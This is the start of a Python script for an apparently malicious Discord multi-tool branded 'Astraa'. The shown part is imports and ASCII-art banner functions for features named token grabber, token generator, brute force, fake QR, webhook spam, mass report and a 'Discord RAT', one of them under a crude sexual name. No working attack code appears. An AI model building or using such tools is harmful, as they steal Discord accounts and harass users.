import requests
import os
import sys
import time
import random
import os.path
import string
import subprocess
import pyperclip
import pyautogui
import urllib.request
import random
import threading
import ctypes
import base64
import discord
import json
import datetime
import shutil
import aiohttp
import asyncio
from colorama import Fore, init
from dhooks import Webhook
from tkinter import *
import tkinter.font as font
from selenium import webdriver
from PIL import Image
from itertools import cycle
from bs4 import BeautifulSoup
import requests as req
from threading import Thread as thr
from discord.ext import commands
from discord.ext.commands import Bot
from plyer import notification
from datetime import datetime
from pypresence import Presence
from discord import Webhook, AsyncWebhookAdapter

os.system(f'title [Discord] All tools in One - Home')
y = Fore.LIGHTYELLOW_EX
b = Fore.LIGHTBLUE_EX
w = Fore.LIGHTWHITE_EX

def Spinner():
	l = ['|', '/', '-', '\\']
	for i in l+l+l:
		sys.stdout.write(f"""\r{y}[{b}#{y}]{w} Loading... {i}""")
		sys.stdout.flush()
		time.sleep(0.2)

def astraahometitle():
    print(f"""\n\n                   {b}█████{y}╗ {b}███████{y}╗{b}████████{y}╗{b}██████{y}╗  {b}█████{y}╗  {b}█████{y}╗ {b}██{y}╗  {b}██{y}╗ {b}██████{y}╗ {b}███{y}╗   {b}███{y}╗{b}███████{y}╗""")
    print(f"""                  {b}██{y}╔══{b}██{y}╗{b}██{y}╔════╝╚══{b}██{y}╔══╝{b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}╗{b}██{y}║  {b}██{y}║{b}██{y}╔═══{b}██{y}╗{b}████{y}╗ {b}████{y}║{b}██{y}╔════╝""")
    print(f"""                  {b}███████{y}║{b}███████{y}╗   {b}██{y}║   {b}██████{y}╔╝{b}███████{y}║{b}███████{y}║{b}███████{y}║{b}██{y}║   {b}██{y}║{b}██{y}╔{b}████{y}╔{b}██{y}║{b}█████{y}╗  """)
    print(f"""                  {b}██{y}╔══{b}██{y}║╚════{b}██{y}║   {b}██{y}║   {b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}║{b}██{y}╔══{b}██{y}║{b}██{y}╔══{b}██{y}║{b}██{y}║   {b}██{y}║{b}██{y}║╚{b}██{y}╔╝{b}██{y}║{b}██{y}╔══╝  """)
    print(f"""                  {b}██{y}║  {b}██{y}║{b}███████{y}║   {b}██{y}║   {b}██{y}║  {b}██{y}║{b}██{y}║  {b}██{y}║{b}██{y}║  {b}██{y}║{b}██{y}║  {b}██{y}║╚{b}██████{y}╔╝{b}██{y}║ ╚═╝ {b}██{y}║{b}███████{y}╗""")
    print(f"""                  ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝\n""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------""")
    print(f"""{w}ev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://as""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------\n""")

def webhooksremovertitle():
    print(f"""\n                               {b}██████{y}╗ {b}███████{y}╗{b}███{y}╗   {b}███{y}╗ {b}██████{y}╗ {b}██{y}╗   {b}██{y}╗{b}███████{y}╗{b}██████{y}╗ """)
    print(f"""                               {b}██{y}╔══{b}██{y}╗{b}██{y}╔════╝{b}████{y}╗ {b}████{y}║{b}██{y}╔═══{b}██{y}╗{b}██{y}║   {b}██{y}║{b}██{y}╔════╝{b}██{y}╔══{b}██{y}╗""")
    print(f"""                               {b}██████{y}╔╝{b}█████{y}╗  {b}██{y}╔{b}████{y}╔{b}██{y}║{b}██{y}║   {b}██{y}║{b}██{y}║   {b}██{y}║{b}█████{y}╗  {b}██████{y}╔╝""")
    print(f"""                               {b}██{y}╔══{b}██{y}╗{b}██{y}╔══╝  {b}██{y}║╚{b}██{y}╔╝{b}██{y}║{b}██{y}║   {b}██{y}║╚{b}██{y}╗ {b}██{y}╔╝{b}██{y}╔══╝  {b}██{y}╔══{b}██{y}╗""")
    print(f"""                               {b}██{y}║  {b}██{y}║{b}███████{y}╗{b}██{y}║ ╚═╝ {b}██{y}║╚{b}██████{y}╔╝ ╚{b}████{y}╔╝ {b}███████{y}╗{b}██{y}║  {b}██{y}║""")
    print(f"""                               ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝\n""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------""")
    print(f"""{w}ev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://as""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------\n""")

def cyclecolorthemetitle():
    print(f"""\n                   {b}██████{y}╗{b}██{y}╗   {b}██{y}╗ {b}██████{y}╗{b}██{y}╗     {b}███████{y}╗    {b}████████{y}╗{b}██{y}╗  {b}██{y}╗{b}███████{y}╗{b}███{y}╗   {b}███{y}╗{b}███████{y}╗""")
    print(f"""                  {b}██{y}╔════╝╚{b}██{y}╗ {b}██{y}╔╝{b}██{y}╔════╝{b}██{y}║     {b}██{y}╔════╝    ╚══{b}██{y}╔══╝{b}██{y}║  {b}██{y}║{b}██{y}╔════╝{b}████{y}╗ {b}████{y}║{b}██{y}╔════╝""")
    print(f"""                  {b}██{y}║      ╚{b}████{y}╔╝ {b}██{y}║     {b}██{y}║     {b}█████{y}╗         {b}██{y}║   {b}███████{y}║{b}█████{y}╗  {b}██{y}╔{b}████{y}╔{b}██{y}║{b}█████{y}╗  """)
    print(f"""                  {b}██{y}║       ╚{b}██{y}╔╝  {b}██{y}║     {b}██{y}║     {b}██{y}╔══╝         {b}██{y}║   {b}██{y}╔══{b}██{y}║{b}██{y}╔══╝  {b}██{y}║╚{b}██{y}╔╝{b}██{y}║{b}██{y}╔══╝  """)
    print(f"""                  ╚{b}██████{y}╗   {b}██{y}║   ╚{b}██████{y}╗{b}███████{y}╗{b}███████{y}╗       {b}██{y}║   {b}██{y}║  {b}██{y}║{b}███████{y}╗{b}██{y}║ ╚═╝ {b}██{y}║{b}███████{y}╗""")
    print(f"""                   ╚═════╝   ╚═╝    ╚═════╝╚══════╝╚══════╝       ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚══════╝\n""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------""")
    print(f"""{w}ev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://as""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------\n""")

def hypesquadchangertitle():
    print(f"""\n                         {b}██{y}╗  {b}██{y}╗{b}██{y}╗   {b}██{y}╗{b}██████{y}╗ {b}███████{y}╗{b}███████{y}╗ {b}██████{y}╗ {b}██{y}╗   {b}██{y}╗ {b}█████{y}╗ {b}██████{y}╗ """)
    print(f"""                         {b}██{y}║  {b}██{y}║╚{b}██{y}╗ {b}██{y}╔╝{b}██{y}╔══{b}██{y}╗{b}██{y}╔════╝{b}██{y}╔════╝{b}██{y}╔═══{b}██{y}╗{b}██{y}║   {b}██{y}║{b}██{y}╔══{b}██{y}{y}╗{b}██{y}╔══{b}██{y}╗""")
    print(f"""                         {b}███████{y}║ ╚{b}████{y}╔╝ {b}██████{y}╔╝{b}█████{y}╗  {b}███████{y}╗{b}██{y}║   {b}██{y}║{b}██{y}║   {b}██{y}║{b}███████{y}║{b}██{y}║  {b}██{y}║""")
    print(f"""                         {b}██{y}╔══{b}██{y}║  ╚{b}██{y}╔╝  {b}██{y}╔═══╝ {b}██{y}╔══╝  ╚════{b}██{y}║{b}██{y}║{b}▄▄ ██{y}║{b}██{y}║   {b}██{y}║{b}██{y}╔══{b}██{y}║{b}██{y}║  {b}██{y}║""")
    print(f"""                         {b}██{y}║  {b}██{y}║   {b}██{y}║   {b}██{y}║     {b}███████{y}╗{b}███████{y}║╚{b}██████{y}╔╝╚{b}██████{y}╔╝{b}██{y}║  {b}██{y}║{b}██████{y}╔╝""")
    print(f"""                         ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚══════╝╚══════╝ ╚══{b}▀▀{y}═╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝\n""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------""")
    print(f"""{w}ev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://as""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------\n""")
                                                                                                                    
def tokengentitle():
    print(f"""\n                        {b}████████{y}╗ {b}██████{y}╗ {b}██{y}╗  {b}██{y}╗{b}███████{y}╗{b}███{y}╗   {b}██{y}╗ {b}██████{y}╗ {b}███████{y}╗{b}███{y}╗   {b}██{y}╗""")
    print(f"""                        {y}╚══{b}██{y}╔══╝{b}██{y}╔═══{b}██{y}╗{b}██{y}║ {b}██{y}╔╝{b}██{y}╔════╝{b}████{y}╗  {b}██{y}║{b}██{y}╔════╝ {b}██{y}╔════╝{b}████{y}╗  {b}██{y}║""")
    print(f"""                           {b}██{y}║   {b}██{y}║   {b}██{y}║{b}█████{y}╔╝ {b}█████{y}╗  {b}██{y}╔{b}██{y}╗ {b}██{y}║{b}██{y}║  {b}███{y}╗{b}█████{y}╗  {b}██{y}╔{b}██{y}╗ {b}██{y}║""")
    print(f"""                          {b} ██{y}║   {b}██{y}║   {b}██{y}║{b}██{y}╔═{b}██{y}╗ {b}██{y}╔══╝  {b}██{y}║╚{b}██{y}╗{b}██{y}║{b}██{y}║   {b}██{y}║{b}██{y}╔══╝  {b}██{y}║╚{b}██{y}╗{b}██{y}║""")
    print(f"""                           {b}██{y}║   ╚{b}██████{y}╔╝{b}██{y}║  {b}██{y}╗{b}███████{y}╗{b}██{y}║ ╚{b}████{y}║╚{b}██████{y}╔╝{b}███████{y}╗{b}██{y}║ ╚{b}████{y}║""")
    print(f"""                           ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝\n""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------""")
    print(f"""{w}ev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://as""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------\n""")

def nitrogentitle():
    print(f"""\n                           {b}███{y}╗   {b}██{y}╗{b}██{y}╗{b}████████{y}╗{b}██████{y}╗  {b}██████{y}╗ {b} ██████{y}╗ {b}███████{y}╗{b}███{y}╗   {b}██{y}╗""")
    print(f"""                           {b}████{y}╗  {b}██{y}║{b}██{y}║╚══{b}██{y}╔══╝{b}██{y}╔══{b}██{y}╗{b}██{y}╔═══{b}██{y}╗{b}██{y}╔════╝ {b}██{y}╔════╝{b}████{y}╗  {b}██{y}║""")
    print(f"""                           {b}██{y}╔{b}██{y}╗ {b}██{y}║{b}██{y}║   {b}██{y}║   {b}██████{y}╔╝{b}██{y}║   {b}██{y}║{b}██{y}║  {b}███{y}╗{b}█████{y}╗  {b}██{y}╔{b}██{y}╗ {b}██{y}║""")
    print(f"""                           {b}██{y}║╚{b}██{y}╗{b}██{y}║{b}██{y}║   {b}██{y}║   {b}██{y}╔══{b}██{y}╗{b}██{y}║   {b}██{y}║{b}██{y}║   {b}██{y}║{b}██{y}╔══╝  {b}██{y}║╚{b}██{y}╗{b}██{y}║""")
    print(f"""                           {b}██{y}║ ╚{b}████{y}║{b}██{y}║   {b}██{y}║   {b}██{y}║  {b}██{y}║╚{b}██████{y}╔╝╚{b}██████{y}╔╝{b}███████{y}╗{b}██{y}║ ╚{b}████{y}║""")
    print(f"""                           ╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═══╝\n""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------""")
    print(f"""{w}ev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://as""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------\n""")

def autologintitle():
    print(f"""\n\n                         {b}█████{y}╗ {b}██{y}╗   {b}██{y}╗{b}████████{y}╗ {b}██████{y}╗ {b}██{y}╗      {b}██████{y}╗  {b}██████{y}╗ {b}██{y}╗{b}███{y}╗   {b}██{y}╗""")
    print(f"""                        {b}██{y}╔══{b}██{y}╗{b}██{y}║   {b}██{y}║╚══{b}██{y}╔══╝{b}██{y}╔═══{b}██{y}╗{b}██{y}║     {b}██{y}╔═══{b}██{y}╗{b}██{y}╔════╝ {b}██{y}║{b}████{y}╗  {b}██{y}║""")
    print(f"""                        {b}███████{y}║{b}██{y}║   {b}██{y}║   {b}██{y}║   {b}██{y}║   {b}██{y}║{b}██{y}║     {b}██{y}║   {b}██{y}║{b}██{y}║  {b}███{y}╗{b}██{y}║{b}██{y}╔{b}██{y}╗ {b}██{y}║""")
    print(f"""                        {b}██{y}╔══{b}██{y}║{b}██{y}║   {b}██{y}║   {b}██{y}║   {b}██{y}║   {b}██{y}║{b}██{y}║     {b}██{y}║   {b}██{y}║{b}██{y}║   {b}██{y}║{b}██{y}║{b}██{y}║╚{b}██{y}╗{b}██{y}║""")
    print(f"""                        {b}██{y}║  {b}██{y}║╚{b}██████{y}╔╝   {b}██{y}║   ╚{b}██████{y}╔╝{b}███████{y}╗╚{b}██████{y}╔╝╚{b}██████{y}╔╝{b}██{y}║{b}██{y}║ ╚{b}████{y}║""")
    print(f"""                        ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝\n""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------""")
    print(f"""{w}ev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://as""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------\n""")

def tokeninfotitle():
    print(f"""\n\n                        {b}████████{y}╗ {b}██████{y}╗ {b}██{y}╗  {b}██{y}╗{b}███████{y}╗{b}███{y}╗   {b}██{y}╗{b}██{y}╗{b}███{y}╗   {b}██{y}╗{b}███████{y}╗ {b}██████{y}╗ """)
    print(f"""                        {y}╚══{b}██{y}╔══╝{b}██{y}╔═══{b}██{y}╗{b}██{y}║ {b}██{y}╔╝{b}██{y}╔════╝{b}████{y}╗  {b}██{y}║{b}██{y}║{b}████{y}╗  {b}██{y}║{b}██{y}╔════╝{b}██{y}╔═══{b}██{y}╗""")
    print(f"""                           {b}██{y}║   {b}██{y}║   {b}██{y}║{b}█████{y}╔╝ {b}█████{y}╗  {b}██{y}╔{b}██{y}╗ {b}██{y}║{b}██{y}║{b}██{y}╔{b}██{y}╗ {b}██{y}║{b}█████{y}╗  {b}██{y}║   {b}██{y}║""")
    print(f"""                           {b}██{y}║   {b}██{y}║   {b}██{y}║{b}██{y}╔═{b}██{y}╗ {b}██{y}╔══╝  {b}██{y}║╚{b}██{y}╗{b}██{y}║{b}██{y}║{b}██{y}║╚{b}██{y}╗{b}██{y}║{b}██{y}╔══╝  {b}██{y}║   {b}██{y}║""")
    print(f"""                           {b}██{y}║   ╚{b}██████{y}╔╝{b}██{y}║  {b}██{y}╗{b}███████{y}╗{b}██{y}║ ╚{b}████{y}║{b}██{y}║{b}██{y}║ ╚{b}████{y}║{b}██{y}║     {y}╚{b}██████{y}╔╝""")
    print(f"""                           ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ \n""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------""")
    print(f"""{w}ev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://as""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------\n""")

def tokenrapetitle():
    print(f"""\n\n                     {b}████████{y}╗ {b}██████{y}╗ {b}██{y}╗  {b}██{y}╗{b}███████{y}╗{b}███{y}╗   {b}██{y}╗{b}██████{y}╗  {b}█████{y}╗ {b}██████{y}╗ {b}███████{y}╗""")
    print(f"""                     {y}╚══{b}██{y}╔══╝{b}██{y}╔═══{b}██{y}╗{b}██{y}║ {b}██{y}╔╝{b}██{y}╔════╝{b}████{y}╗  {b}██{y}║{b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}╗{b}██{y}╔════╝""")
    print(f"""                        {b}██{y}║   {b}██{y}║   {b}██{y}║{b}█████{y}╔╝ {b}█████{y}╗  {b}██{y}╔{b}██{y}╗ {b}██{y}║{b}██████{y}╔╝{b}███████{y}║{b}██████{y}╔╝{b}█████{y}╗  """)
    print(f"""                        {b}██{y}║   {b}██{y}║   {b}██{y}║{b}██{y}╔═{b}██{y}╗ {b}██{y}╔══╝  {b}██{y}║╚{b}██{y}╗{b}██{y}║{b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}║{b}██{y}╔═══╝ {b}██{y}╔══╝  """)
    print(f"""                        {b}██{y}║   ╚{b}██████{y}╔╝{b}██{y}║  {b}██{y}╗{b}███████{y}╗{b}██{y}║ ╚{b}████{y}║{b}██{y}║  {b}██{y}║{b}██{y}║  {b}██{y}║{b}██{y}║     {b}███████{y}╗""")
    print(f"""                        ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝\n""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------""")
    print(f"""{w}ev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://as""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------\n""")

def brutforcetitle():
    print(f"""\n\n                        {b}██████{y}╗ {b}██████{y}╗ {b}██{y}╗   {b}██{y}╗{b}████████{y}╗{b}███████{y}╗ {b}██████{y}╗ {b}██████{y}╗  {b}██████{y}╗{b}███████{y}╗""")
    print(f"""                        {b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}╗{b}██{y}║   {b}██{y}║╚══{b}██{y}╔══╝{b}██{y}╔════╝{b}██{y}╔═══{b}██{y}╗{b}██{y}╔══{b}██{y}╗{b}██{y}╔════╝{b}██{y}╔════╝""")
    print(f"""                        {b}██████{y}╔╝{b}██████{y}╔╝{b}██{y}║   {b}██{y}║   {b}██{y}║   {b}█████{y}╗  {b}██{y}║   {b}██{y}║{b}██████{y}╔╝{b}██{y}║     {b}█████{y}╗  """)
    print(f"""                        {b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}╗{b}██{y}║   {b}██{y}║   {b}██{y}║   {b}██{y}╔══╝  {b}██{y}║   {b}██{y}║{b}██{y}╔══{b}██{y}╗{b}██{y}║     {b}██{y}╔══╝  """)
    print(f"""                        {b}██████{y}╔╝{b}██{y}║  {b}██{y}║╚{b}██████{y}╔╝   {b}██{y}║   {b}██{y}║     ╚{b}██████{y}╔╝{b}██{y}║  {b}██{y}║╚{b}██████{y}╗{b}███████{y}╗""")
    print(f"""                        ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝\n""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------""")
    print(f"""{w}ev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://as""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------\n""")

def fakeqrtitle():
    print(f"""\n\n                                   {b}███████{y}╗ {b}█████{y}╗ {b}██{y}╗  {b}██{y}╗{b}███████{y}╗     {b}██████{y}╗ {b}██████{y}╗ """)
    print(f"""                                   {b}██{y}╔════╝{b}██{y}╔══{b}██{y}╗{b}██{y}║ {b}██{y}╔╝{b}██{y}╔════╝    {b}██{y}╔═══{b}██{y}╗{b}██{y}╔══{b}██{y}╗""")
    print(f"""                                   {b}█████{y}╗  {b}███████{y}║{b}█████{y}╔╝ {b}█████{y}╗      {b}██{y}║   {b}██{y}║{b}██████{y}╔╝""")
    print(f"""                                   {b}██{y}╔══╝  {b}██{y}╔══{b}██{y}║{b}██{y}╔═{b}██{y}╗ {b}██{y}╔══╝      {b}██{y}║{b}▄▄ ██{y}║{b}██{y}╔══{b}██{y}╗""")
    print(f"""                                   {b}██{y}║     {b}██{y}║  {b}██{y}║{b}██{y}║  {b}██{y}╗{b}███████{y}╗    ╚{b}██████{y}╔╝{b}██{y}║  {b}██{y}║""")
    print(f"""                                   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝     ╚══{b}▀▀{y}═╝ ╚═╝  ╚═╝\n""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------""")
    print(f"""{w}ev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://as""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------\n""")

def tokengrabbertitle():
    print(f"""\n\n         {b}████████{y}╗ {b}██████{y}╗ {b}██{y}╗ {b}███{y}╗{b}███████{y}╗{b}███{y}╗   {b}██{y}╗     {b}██████{y}╗ {b}██████{y}╗  {b}█████{y}╗ {b}██████{y}╗ {b}██████{y}╗ {b}███████{y}╗{b}██████{y}╗ """)
    print(f"""         {y}╚══{b}██{y}╔══╝{b}██{y}╔═══{b}██{y}╗{b}██{y}║ {b}██{y}╔╝{b}██{y}╔════╝{b}████{y}╗  {b}██{y}║    {b}██{y}╔════╝ {b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}╗{b}██{y}╔════╝{b}██{y}╔══{b}██{y}╗""")
    print(f"""            {b}██{y}║   {b}██{y}║   {b}██{y}║{b}█████{y}╔╝ {b}█████{y}╗  {b}██{y}╔{b}██{y}╗ {b}██{y}║    {b}██{y}║  {b}███{y}╗{b}██████{y}╔╝{b}███████{y}║{b}██████{y}╔╝{b}██████{y}╔╝{b}█████{y}╗  {b}██████{y}╔╝""")
    print(f"""            {b}██{y}║   {b}██{y}║   {b}██{y}║{b}██{y}╔═{b}██{y}╗ {b}██{y}╔══╝  {b}██{y}║╚{b}██{y}╗{b}██{y}║    {b}██{y}║   {b}██{y}║{b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}║{b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}╗{b}██{y}╔══╝  {b}██{y}╔══{b}██{y}╗""")
    print(f"""            {b}██{y}║   ╚{b}██████{y}╔╝{b}██{y}║  {b}██{y}╗{b}███████{y}╗{b}██{y}║ ╚{b}████{y}║    ╚{b}██████{y}╔╝{b}██{y}║  {b}██{y}║{b}██{y}║  {b}██{y}║{b}██████{y}╔╝{b}██████{y}╔╝{b}███████{y}╗{b}██{y}║  {b}██{y}║""")
    print(f"""            ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝\n""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------""")
    print(f"""{w}ev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://as""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------\n""")

def webhookspamtitle():
    print(f"""\n\n            {b}██{y}╗    {b}██{y}╗{b}███████{y}╗{b}██████{y}╗ {b}██{y}╗  {b}██{y}╗ {b}██████{y}╗  {b}██████{y}╗{b} ██{y}╗  {b}██{y}╗    {b}███████{y}╗{b}██████{y}╗  {b}█████{y}╗ {b}███{y}╗   {b}███{y}╗""")
    print(f"""            {b}██{y}║    {b}██{y}║{b}██{y}╔════╝{b}██{y}╔══{b}██{y}╗{b}██{y}║  {b}██{y}║{b}██{y}╔═══{b}██{y}╗{b}██{y}╔═══{b}██{y}╗{b}██{y}║ {b}██{y}╔╝    {b}██{y}╔════╝{b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}╗{b}████{y}╗ {b}████{y}║""")
    print(f"""            {b}██{y}║ {b}█{y}╗ {b}██{y}║{b}█████{y}╗  {b}██████{y}╔╝{b}███████{y}║{b}██{y}║   {b}██{y}║{b}██{y}║   {b}██{y}║{b}█████{y}╔╝     {b}███████{y}╗{b}██████{y}╔╝{b}███████{y}║{b}██{y}╔{b}████{y}╔{b}██{y}║""")
    print(f"""           {b} ██{y}║{b}███{y}╗{b}██{y}║{b}██{y}╔══╝  {b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}║{b}██{y}║   {b}██{y}║{b}██{y}║   {b}██{y}║{b}██{y}╔═{b}██{y}╗     ╚════{b}██{y}║{b}██{y}╔═══╝ {b}██{y}╔══{b}██{y}║{b}██{y}║╚{b}██{y}╔╝{b}██{y}║""")
    print(f"""            {y}╚{b}███{y}╔{b}███{y}╔╝{b}███████{y}╗{b}██████{y}╔╝{b}██{y}║  {b}██{y}║╚{b}██████{y}╔╝╚{b}██████{y}╔╝{b}██{y}║  {b}██{y}╗    {b}███████{y}║{b}██{y}║     {b}██{y}║  {b}██{y}║{b}██{y}║ ╚═╝ {b}██{y}║""")
    print(f"""             ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝    ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝\n""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------""")
    print(f"""{w}ev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://as""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------\n""")

def massreporttitle():
    print(f"""\n\n                  {b}███{y}╗   {b}███{y}╗ {b}█████{y}╗ {b}███████{y}╗{b}███████{y}╗    {b}██████{y}╗ {b}███████{y}╗{b}██████{y}╗  {b}██████{y}╗ {b}██████{y}╗ {b}████████{y}╗""")
    print(f"""                 {b} ████{y}╗ {b}████{y}║{b}██{y}╔══{b}██{y}╗{b}██{y}╔════╝{b}██{y}╔════╝    {b}██{y}╔══{b}██{y}╗{b}██{y}╔════╝{b}██{y}╔══{b}██{y}╗{b}██{y}╔═══{b}██{y}╗{b}██{y}╔══{b}██{y}╗╚══{b}██{y}╔══╝""")
    print(f"""                  {b}██{y}╔{b}████{y}╔{b}██{y}║{b}███████{y}║{b}███████{y}╗{b}███████{y}╗    {b}██████{y}╔╝{b}█████{y}╗  {b}██████{y}╔╝{b}██{y}║   {b}██{y}║{b}██████{y}╔╝   {b}██{y}║   """)
    print(f"""                  {b}██{y}║╚{b}██{y}╔╝{b}██{y}║{b}██{y}╔══{b}██{y}║╚════{b}██{y}║╚════{b}██{y}║    {b}██{y}╔══{b}██{y}╗{b}██{y}╔══╝  {b}██{y}╔═══╝ {b}██{y}║   {b}██{y}║{b}██{y}╔══{b}██{y}╗   {b}██{y}║   """)
    print(f"""                 {b} ██{y}║ ╚═╝ {b}██{y}║{b}██{y}║  {b}██{y}║{b}███████{y}║{b}███████{y}║    {b}██{y}║  {b}██{y}║{b}███████{y}╗{b}██{y}║     ╚{b}██████{y}╔╝{b}██{y}║  {b}██{y}║   {b}██{y}║   """)
    print(f"""                  ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   \n""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------""")
    print(f"""{w}ev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://as""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------\n""")

def discordrattitle():
    print(f"""\n\n                    {b}██████{y}╗ {b}██{y}╗{b}███████{y}╗ {b}██████{y}╗ {b}██████{y}╗ {b}██████{y}╗ {b}██████{y}╗     {b}██████{y}╗  {b}█████{y}╗ {b}████████{y}╗""")
    print(f"""                    {b}██{y}╔══{b}██{y}╗{b}██{y}║{b}██{y}╔════╝{b}██{y}╔════╝{b}██{y}╔═══{b}██{y}╗{b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}╗    {b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}╗╚══{b}██{y}╔══╝""")
    print(f"""                    {b}██{y}║  {b}██{y}║{b}██{y}║{b}███████{y}╗{b}██{y}║     {b}██{y}║   {b}██{y}║{b}██████{y}╔╝{b}██{y}║  {b}██{y}║    {b}██████{y}╔╝{b}███████{y}║   {b}██{y}║   """)
